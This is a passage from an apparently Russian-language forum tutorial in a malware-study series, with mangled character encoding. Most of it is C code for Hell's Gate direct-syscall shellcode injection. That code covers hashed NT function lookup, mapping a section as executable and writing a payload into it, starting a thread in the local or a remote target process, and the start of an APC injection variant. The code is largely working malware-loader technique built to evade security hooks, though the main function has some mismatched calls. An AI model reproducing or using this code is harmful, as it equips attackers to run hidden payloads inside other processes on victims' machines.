printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtClose&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
–ö–∞–∫ —Ç–æ–ª—å–∫–æ –∑–Ω–∞—á–µ–Ω–∏—è —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω—ã, –¥–æ–±–∞–≤—å—Ç–µ –∏—Ö –≤ –Ω–∞—á–∞–ª–æ –ø—Ä–æ–µ–∫—Ç–∞ Hell&#039;s Gate:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define NtCreateSection_djb2         0x5687F81AC5D1497A
#define NtMapViewOfSection_djb2      0x0778E82F702E79D4
#define NtUnmapViewOfSection_djb2    0x0BF2A46A27B93797
#define NtClose_djb2                 0x0DA4FA80EF5031E7
#define NtCreateThreadEx_djb2        0x2786FB7E75145F1A</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏–∏ LocalMappingInjectionViaSyscalls –∏ RemoteMappingInjectionViaSyscalls</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize     = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è
    HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] –í—ã–¥–µ–ª–µ–Ω –∞–¥—Ä–µ—Å: 0x%p —Ä–∞–∑–º–µ—Ä–æ–º: %ld \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------
    // –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ —Å 0x%p –ø–æ 0x%p \n&quot;, pPayload, pAddress);
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞
    printf(&quot;\t[i] –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ —Å —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ 0x%p ... &quot;, pAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);
    printf(&quot;\t[+] –ü–æ—Ç–æ–∫ —Å–æ–∑–¥–∞–Ω —Å ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // –û—Ç–º–µ–Ω–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è - —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ä–∞–∑–¥–µ–ª–∞
    HellsGate(pVxTable-&gt;NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è

    HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] –õ–æ–∫–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∞ –ø–æ –∞–¥—Ä–µ—Å—É: 0x%p —Ä–∞–∑–º–µ—Ä–æ–º: %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

    // –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ —Å 0x%p –ø–æ 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è
    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [R] –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] –£–¥–∞–ª–µ–Ω–Ω–∞—è –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∞ –ø–æ –∞–¥—Ä–µ—Å—É: 0x%p —Ä–∞–∑–º–µ—Ä–æ–º: %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É ... &quot;);
    getchar();
    printf(&quot;\t[i] –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ —Å —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ 0x%p ... &quot;, pRemoteAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û \n&quot;);
    printf(&quot;\t[+] –ü–æ—Ç–æ–∫ —Å–æ–∑–¥–∞–Ω —Å ID: %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // –û—Ç–º–µ–Ω–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è - —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ä–∞–∑–¥–µ–ª–∞
    HellsGate(pVxTable-&gt;NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≥–ª–∞–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∞, —á—Ç–æ–±—ã –≤—ã–∑—ã–≤–∞—Ç—å LocalMappingInjectionViaSyscalls –≤–º–µ—Å—Ç–æ <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">payload function</a>. –§—É–Ω–∫—Ü–∏—è –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤—ã—à–µ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ö—ç—à–∏, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT main() {
    // Getting the PEB structure
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return 0x1;

    // Getting the NTDLL module
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Getting the EAT of Ntdll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

//--------------------------------------------------------------------------
    // Initializing the &#039;Table&#039; structure
    VX_TABLE Table = { 0 };
    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
        return 0x1;

//--------------------------------------------------------------------------
    // injection code - calling the &#039;ClassicInjectionViaSyscalls&#039; function


// If local injection
#ifdef LOCAL_INJECTION if (!LocalMappingInjectionViaSyscalls(&amp;Table, (HANDLE)-1, Payload, sizeof(Payload)))
        return 0x1;
#endif // LOCAL_INJECTION// If remote injection
#ifdef REMOTE_INJECTION// Open a handle to the target process
    printf(&quot;[i] Targeting process of id : %d \n&quot;, PROCESS_ID);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
    if (hProcess == NULL) {
        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    if (!RemoteMappingInjectionViaSyscalls(&amp;Table, hProcess, Payload, sizeof(Payload)))
        return 0x1;

#endif // REMOTE_INJECTIONreturn 0x00;
}</code></pre>
	</div>
</div><br />
<b>–õ–æ–∫–∞–ª—å–Ω–∞—è vs —É–¥–∞–ª–µ–Ω–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è</b><br />
<br />
–ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ –ø—Ä–µ–¥—ã–¥—É—â–µ–º—É –º–æ–¥—É–ª—é, –±—ã–ª —Å–æ–∑–¥–∞–Ω –º–∞–∫—Ä–æ—Å-–ø—Ä–µ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–Ω—ã–π –∫–æ–¥ –¥–ª—è —Ü–µ–ª–µ–π –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –µ—Å–ª–∏ LOCAL_INJECTION –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ. –ü—Ä–∏–º–µ—Ä –ø—Ä–µ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–Ω–æ–≥–æ –∫–æ–¥–∞ –ø—Ä–∏–≤–µ–¥–µ–Ω –Ω–∏–∂–µ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define LOCAL_INJECTION#ifndef LOCAL_INJECTION#define REMOTE_INJECTION// –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ PID —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
#define PROCESS_ID    18784    #endif // !LOCAL_INJECTION</code></pre>
	</div>
</div><br />
<b>–î–∞–≤–∞–π—Ç–µ —Ç–µ–ø–µ—Ä—å –ø–µ—Ä–µ–ø–∏—à–µ–º —Ç–µ—Ö–Ω–∏–∫—É –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É APC Injection | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;</b><br />
<br />
–≠—Ç–æ—Ç –º–æ–¥—É–ª—å —Ä–µ–∞–ª–∏–∑—É–µ—Ç —Ç–µ—Ö–Ω–∏–∫—É –∏–Ω—ä–µ–∫—Ü–∏–∏ APC —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∑–∞–º–µ–Ω—è—è WinAPI –Ω–∞ –∏—Ö —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç—ã —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ –∏ –∑–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥—É—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–π NtAllocateVirtualMemory, NtProtectVirtualMemory –∏ NtWriteVirtualMemory, –∫–æ—Ç–æ—Ä—ã–µ —É–∂–µ –æ–±—Å—É–∂–¥–∞–ª–∏—Å—å –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∫–ª–∞—Å—Å–∏—á–µ—Å–∫–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏. –û—Å—Ç–∞–≤—à–∏–π—Å—è —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –æ–±—ä—è—Å–Ω–µ–Ω, - —ç—Ç–æ NtQueueApcThread.<br />
<br />
QueueUserAPC –∑–∞–º–µ–Ω–µ–Ω –Ω–∞ NtQueueApcThread.<br />
<br />
<b>NtQueueApcThread<br />
<br />
–≠—Ç–æ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ —è–≤–ª—è–µ—Ç—Å—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º QueueUserAPC WinAPI. N–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω –ø—Ä–∏–º–µ—Ä NtQueueApcThread.</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtQueueApcThread(
IN HANDLE ThreadHandle, // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —É–∫–∞–∑–∞–Ω–Ω–æ–π APC
IN PIO_APC_ROUTINE ApcRoutine, // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—É—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º —Ñ—É–Ω–∫—Ü–∏—é APC –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
IN PVOID ApcRoutineContext OPTIONAL, // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä (1) –¥–ª—è APC (—É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ NULL)
IN PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä (2) –¥–ª—è APC (—É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ NULL)
IN ULONG ApcReserved OPTIONAL // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä (3) –¥–ª—è APC (—É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ NULL)
);</code></pre>
	</div>
</div><br />
–ü–µ—Ä–≤—ã–µ –¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ —Ç—Ä–∏–≤–∏–∞–ª—å–Ω—ã –¥–ª—è –ø–æ–Ω–∏–º–∞–Ω–∏—è. –û—Å—Ç–∞–≤—à–∏–µ—Å—è —Ç—Ä–∏ - ApcRoutineContext, ApcStatusBlock –∏ ApcReserved, –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ APC, ApcRoutine.<br />
<br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞, –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—â–µ–≥–æ —Å–∏–≥–Ω–∞–ª—ã</b><br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É —Ç–µ—Ö–Ω–∏–∫–∞ –∏–Ω—ä–µ–∫—Ü–∏–∏ APC —Ç—Ä–µ–±—É–µ—Ç –Ω–∞–ª–∏—á–∏—è –ø–æ—Ç–æ–∫–∞ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏, –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—â–µ–º —Å–∏–≥–Ω–∞–ª—ã, —ç—Ç–æ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ CreateThread WinAPI.<br />
<br />
–§—É–Ω–∫—Ü–∏—è AlterableFunction –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –∂–µ—Ä—Ç–≤–µ–Ω–Ω—ã–º –ø–æ—Ç–æ–∫–æ–º.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlterableFunction() {

HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);

MsgWaitForMultipleObjectsEx(
1,
&amp;hEvent,
INFINITE,
QS_HOTKEY,
MWMO_ALERTABLE
);

}</code></pre>
	</div>
</div><br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetProcAddress –∏ GetModuleHandle </b><br />
<br />
–°–æ–∑–¥–∞–µ—Ç—Å—è –∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç—Å—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ Syscall —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ InitializeSyscallStruct, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –∞–¥—Ä–µ—Å–∞ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
